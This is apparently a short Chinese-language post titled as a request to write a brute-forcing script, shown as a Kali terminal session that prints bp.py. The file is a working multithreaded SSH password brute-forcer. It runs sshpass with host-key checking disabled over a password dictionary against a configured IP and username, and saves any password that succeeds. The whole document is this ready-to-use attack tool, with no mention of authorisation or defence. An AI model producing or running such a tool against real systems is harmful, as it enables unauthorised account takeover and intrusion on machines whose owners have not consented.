写个脚本进行爆破

┌──(root㉿kali)-[/home/kali/aaa]
└─# cat bp.py    
#!/usr/bin/env python3
import subprocess
import os
import time
from threading import Thread

# 配置
TARGET = "192.168.1.100"  # 目标 IP 或主机名
USERNAME = "admin"         # 目标用户名
PASSWORD_FILE = "pass.txt"  # 密码字典文件
THREADS = 4                # 线程数（提高速度）
TIMEOUT = 5               # 超时时间（秒）

# 统计信息
attempts = 0
found = False

def clear_screen():
    """清屏"""
    os.system('clear' if os.name == 'posix' else 'cls')

def try_password(password):
    """尝试一个密码"""
    global attempts, found

    if found:
        return  # 如果已找到密码，停止其他线程

    attempts += 1
    print(f"[*] 尝试 {attempts}: {password}")

    try:
        # 示例：SSH 爆破（使用 sshpass）
        cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {USERNAME}@{TARGET} 'exit'"
        result = subprocess.run(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=TIMEOUT
        )

        # 如果返回码为 0，说明登录成功
        if result.returncode == 0:
            found = True
            clear_screen()
            print(f"[+] 密码找到！用户名: {USERNAME}, 密码: {password}")
            with open("found_password.txt", "w") as f:
                f.write(f"Username: {USERNAME}\nPassword: {password}\n")
            os._exit(0)  # 直接退出程序

    except subprocess.TimeoutExpired:
        pass  # 超时忽略
    except Exception as e:
        print(f"[!] 错误: {e}")

def main():
    clear_screen()
    print(f"[*] 目标: {USERNAME}@{TARGET}")
    print(f"[*] 密码字典: {PASSWORD_FILE}")
    print(f"[*] 线程数: {THREADS}")
    print("-" * 50)

    # 读取密码字典
    if not os.path.exists(PASSWORD_FILE):
        print(f"[!] 错误: {PASSWORD_FILE} 不存在！")
        return

    with open(PASSWORD_FILE, "r") as f:
        passwords = [line.strip() for line in f if line.strip()]

    if not passwords:
        print("[!] 错误: 密码字典为空！")
        return

    # 多线程爆破
    threads = []
    for password in passwords:
        if found:
            break
        while len(threads) >= THREADS:
            for t in threads:
                if not t.is_alive():
                    threads.remove(t)
            time.sleep(0.1)
        t = Thread(target=try_password, args=(password,))
        t.start()
        threads.append(t)

    # 等待所有线程完成
    for t in threads:
        t.join()

    if not found:
        print("[-] 爆破完成，未找到正确密码！")

if __name__ == "__main__":
    main()
